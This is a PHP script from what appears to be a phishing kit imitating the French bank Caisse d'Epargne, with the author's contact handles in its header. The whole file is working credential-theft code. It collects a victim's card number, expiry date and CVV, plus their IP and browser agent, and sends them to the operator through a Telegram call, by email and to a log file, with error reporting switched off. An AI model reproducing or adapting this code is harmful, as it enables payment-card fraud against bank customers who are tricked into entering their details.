<?php
/*
Author : DIB
Email : b41tsm@gmail.com
ICQ : @MorrisWorm

*/
error_reporting(0);

if(isset($_POST['ccnum4'])&& isset($_POST['exp'])&& isset($_POST['ccv'])){
if(!empty($_POST['ccnum4'])&& !empty($_POST['exp'])&& !empty($_POST['ccv'])){
	
	include '../../config.php';
	include 'funcs.php';
	$agent = $_SERVER['HTTP_USER_AGENT'];

	$cc_number = $_POST['ccnum4'];
	$cc_date = $_POST['exp'];
	$cc_cvv = $_POST['ccv'];

	$message = "CC : $cc_number\nExp : $cc_date\nCVV : $cc_cvv\nAgent: $agent\nIp: $ip";
	$suj = "Caisse D'epargne - Full INFO FROM $ip";
	toTG($message);
	mail($to,$suj,$message);
		$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);
	echo json_encode(['status'=>200,]);
	
}else{
	
	header('Location: ../cc.php');
}	
	
	
}else{
	header('Location: ../index.html');
}
?>